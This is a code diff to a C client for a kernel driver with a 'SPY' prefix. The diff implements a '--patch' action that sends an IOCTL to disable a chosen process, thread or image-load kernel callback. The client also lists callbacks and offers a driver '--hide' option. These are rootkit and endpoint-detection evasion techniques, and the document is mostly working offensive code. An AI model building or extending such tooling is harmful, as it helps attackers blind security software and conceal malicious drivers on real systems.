@@ -67,7 +67,6 @@ BOOL ConversionGuard(const CHAR* str) {
 
 int HandleCallbackCommand(int argc, char* argv[], char* buffer)
 {
-
     if (argc < 3) {
         printf("[!] Missing action for callback category\n");
         printf("Usage: %s callback --list|--patch \n", argv[0]);
@@ -78,14 +77,35 @@ int HandleCallbackCommand(int argc, char* argv[], char* buffer)
 
     // Action: --patch
     if (strcmp(action, "--patch") == 0) {
-        printf("[*] Patching kernel callback...\n\n");
-		printf("[!] Not implemented yet\n");
+        if (argc != 6 || strcmp(argv[4], "--type") != 0) {
+            printf("[-] Usage: %s --patch <id> --type <0,1,2>\n", argv[0]);
+            return -1;
+        }
+        printf("");
+        const char* callbackIdStr = argv[3];
+        const char* typeStr = argv[5];
+
+        ULONG callbackIndex = strtoul(callbackIdStr, NULL, 10);
+        ULONG callbackType = strtoul(typeStr, NULL, 10);
+        if (callbackType > 2) {
+           /* printf("[-] Invalid callback type: %lu. Must be 0=Process, 1=Thread, 2=LoadImage\n", callbackType);*/
+            return -1;
+        }
+
+        //printf("[*] Patching kernel callback: index=%lu, type=%lu\n", callbackIndex, callbackType);
+
+        SPY_PATCH_INPUT input = { 0 };
+        input.Index = callbackIndex;
+        input.Type = callbackType;
+
+        memcpy(buffer, &input, sizeof(input));
+        SendIOCTL(IOCTL_SPY_PATCH, buffer, sizeof(input), buffer, BUFFER_SIZE);
+
         return 0;
     }
     
     // Action: --list
     else if (strcmp(action, "--list") == 0) {
-        /*printf("[*] Enumerating kernel callbacks...\n\n");*/
         SendIOCTL(IOCTL_SPY_PCALLBACK, NULL, 0, buffer, BUFFER_SIZE);
         printf("\n");
         SendIOCTL(IOCTL_SPY_TCALLBACK, NULL, 0, buffer, BUFFER_SIZE);
@@ -103,7 +123,6 @@ int HandleCallbackCommand(int argc, char* argv[], char* buffer)
 
 int HandleDriverCommand(int argc, char* argv[], char* buffer)
 {   
-   
     if (argc < 3) {
         printf("[!] Missing action for driver category\n");
         printf("Usage: %s driver --list|--hide|--callback\n", argv[0]);
